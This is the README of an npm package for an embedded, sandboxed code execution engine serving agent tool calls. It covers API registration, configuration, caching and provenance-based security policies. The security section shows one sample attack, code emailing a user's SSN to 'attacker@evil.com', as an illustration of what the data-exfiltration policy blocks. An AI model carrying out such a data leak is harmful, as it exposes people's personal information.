# @mondaydotcomorg/atp-engine

Embedded execution engine for Agent Tool Protocol - execute code in a secure sandbox without HTTP server overhead.

## Overview

The ATP engine provides **direct, in-process code execution** with sandboxing, API aggregation, and provenance tracking. Perfect for:

- CLI tools
- Single-process applications
- Testing and development
- Embedded scenarios
- When you don't need pause/resume for LLM callbacks

## Installation

```bash
npm install @mondaydotcomorg/atp-engine
```

## Quick Start

```typescript
import { ATPEngine } from '@mondaydotcomorg/atp-engine';
import { loadOpenAPI } from '@mondaydotcomorg/atp-server';

// Create engine
const engine = new ATPEngine({
  timeout: 30000,
  memory: 128 * 1024 * 1024
});

// Register APIs by ID
const petstoreSpec = await loadOpenAPI('https://petstore.swagger.io/v2/swagger.json');
engine.registerAPI('petstore', {
  type: 'openapi',
  spec: petstoreSpec
});

// Execute code directly - no HTTP needed
const result = await engine.execute(`
  const pets = await atp.api.petstore.findPetsByStatus({ 
    status: 'available' 
  });
  
  return {
    total: pets.length,
    categories: [...new Set(pets.map(p => p.category?.name))].slice(0, 5)
  };
`);

console.log(result);
// { total: 42, categories: ['Dogs', 'Cats', 'Birds', 'Fish', 'Reptiles'] }
```

## Features

- ✅ **Direct execution**: No HTTP server, no network overhead
- ✅ **Sandboxed**: Secure isolated-vm execution
- ✅ **API aggregation**: OpenAPI, MCP, custom functions
- ✅ **Provenance tracking**: Security policies enforced
- ✅ **Compiler integration**: Loop transformation, batch optimization
- ✅ **Cache support**: Redis, memory, or custom
- ✅ **Type generation**: Full TypeScript definitions for APIs

## API Registration

### OpenAPI

```typescript
import { loadOpenAPI } from '@mondaydotcomorg/atp-server';

const githubSpec = await loadOpenAPI('https://api.github.com/openapi.json', {
  name: 'github',
  auth: {
    type: 'bearer',
    token: process.env.GITHUB_TOKEN
  }
});

engine.registerAPI('github', {
  type: 'openapi',
  spec: githubSpec
});

// Now available: atp.api.github.*
```

### MCP Servers

```typescript
import { MCPConnector } from '@mondaydotcomorg/atp-mcp-adapter';

const mcpConnector = new MCPConnector();
const filesystemAPI = await mcpConnector.connectToMCPServer({
  name: 'filesystem',
  command: 'npx',
  args: ['-y', '@modelcontextprotocol/server-filesystem', '/path/to/files']
});

engine.registerAPI('filesystem', {
  type: 'mcp',
  spec: filesystemAPI
});

// Now available: atp.api.filesystem.*
```

### Custom Functions

```typescript
engine.registerAPI('database', {
  type: 'custom',
  functions: [
    {
      name: 'getUser',
      description: 'Get user by ID',
      inputSchema: {
        type: 'object',
        properties: {
          id: { type: 'string' }
        },
        required: ['id']
      },
      handler: async (input) => {
        return await db.users.findById(input.id);
      }
    }
  ]
});

// Now available: atp.api.database.getUser()
```

## Configuration

```typescript
const engine = new ATPEngine({
  // Execution limits
  timeout: 30000,              // 30 seconds
  memory: 128 * 1024 * 1024,   // 128 MB
  
  // Compiler
  enableCompiler: true,
  enableBatchParallel: true,
  
  // Provenance security
  provenanceMode: 'proxy',     // 'none' | 'proxy' | 'ast'
  securityPolicies: [
    preventDataExfiltration,
    requireUserOrigin
  ],
  
  // Cache
  cacheProvider: redisCacheProvider,
  
  // Logging
  logger: pinoLogger
});
```

## Provenance Security

```typescript
import { 
  ProvenanceMode,
  preventDataExfiltration,
  requireUserOrigin 
} from '@mondaydotcomorg/atp-provenance';

const engine = new ATPEngine({
  provenanceMode: ProvenanceMode.PROXY,
  securityPolicies: [
    preventDataExfiltration,  // Block data exfiltration
    requireUserOrigin         // Require user-originated data
  ]
});

// Blocks exfiltration attempts automatically
await engine.execute(`
  const user = await atp.api.database.getUser({ id: '123' });
  
  // This will throw - external recipient with restricted data
  await atp.api.email.send({
    to: 'attacker@evil.com',
    body: user.ssn  // ❌ Blocked by provenance
  });
`);
```

## Type Definitions

Get TypeScript definitions for all registered APIs:

```typescript
const types = await engine.getTypeDefinitions();
// Returns: Full TypeScript declarations for atp.api.*

// Save to file for IDE autocomplete
import { writeFileSync } from 'fs';
writeFileSync('atp.d.ts', types);
```

## API Discovery

```typescript
// List all registered APIs
const apis = engine.listAPIs();
// ['petstore', 'github', 'database']

// Get API metadata
const metadata = engine.getAPIMetadata('petstore');
// { name, type, functions: [...] }

// Search APIs
const results = await engine.searchAPIs('create user');
// [{ api: 'database', function: 'createUser', score: 0.95 }]
```

## Execution Results

```typescript
interface ExecutionResult {
  status: 'success' | 'error' | 'timeout';
  result?: unknown;
  error?: string;
  duration: number;
  memoryUsed: number;
  logs: string[];
}

const result = await engine.execute(code);

if (result.status === 'success') {
  console.log('Result:', result.result);
} else if (result.status === 'error') {
  console.error('Error:', result.error);
} else if (result.status === 'timeout') {
  console.error('Execution timed out');
}
```

## Logging

The engine logs all execution events:

```typescript
import pino from 'pino';

const logger = pino({ level: 'info' });

const engine = new ATPEngine({ logger });

// Logs:
// - API function calls
// - Execution start/end
// - Errors and warnings
// - Security policy violations
// - Provenance tracking events
```

## Caching

Use Redis or memory cache for state persistence:

```typescript
import { RedisCache } from '@mondaydotcomorg/atp-providers';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);
const cache = new RedisCache({ redis });

const engine = new ATPEngine({
  cacheProvider: cache
});

// Cache is used for:
// - API call caching
// - Execution state (if using compiler checkpoints)
// - Provenance hints
```

## Compiler Integration

The engine uses the pluggable compiler system:

```typescript
import { createDefaultCompiler } from '@mondaydotcomorg/atp-compiler';

const compiler = createDefaultCompiler({
  enableBatchParallel: true,
  batchSizeThreshold: 5
});

// Add custom plugins
compiler.use(myCustomPlugin);

const engine = new ATPEngine({
  compiler,  // Use custom compiler
  enableCompiler: true
});
```

## Comparison: Engine vs Server

| Feature | ATPEngine | ATPServer |
|---------|-----------|-----------|
| HTTP Server | ❌ No | ✅ Yes |
| Port Binding | ❌ No | ✅ Yes |
| Pause/Resume | ❌ No | ✅ Yes |
| LLM Callbacks | ❌ No | ✅ Yes |
| Approval Workflows | ❌ No | ✅ Yes |
| Client Embeddings | ❌ No | ✅ Yes |
| Direct Execution | ✅ Yes | ❌ No |
| Embedded Usage | ✅ Yes | ❌ No |
| Lower Latency | ✅ Yes | ❌ No |
| Simpler Deployment | ✅ Yes | ❌ No |

**Use ATPEngine when:**
- Building CLI tools
- Single-process applications
- Testing and development
- You don't need LLM callbacks

**Use ATPServer when:**
- LLM agents need to call `atp.llm.*`
- Human-in-the-loop approvals
- Horizontal scaling across pods
- Client-side tool execution

## Examples

See the `examples/` directory:
- `examples/embedded-engine/` - Basic engine usage
- `examples/engine-with-openapi/` - OpenAPI integration
- `examples/engine-with-mcp/` - MCP server integration
- `examples/engine-security/` - Provenance and security

## TypeScript Support

Full TypeScript definitions included.

## License

MIT

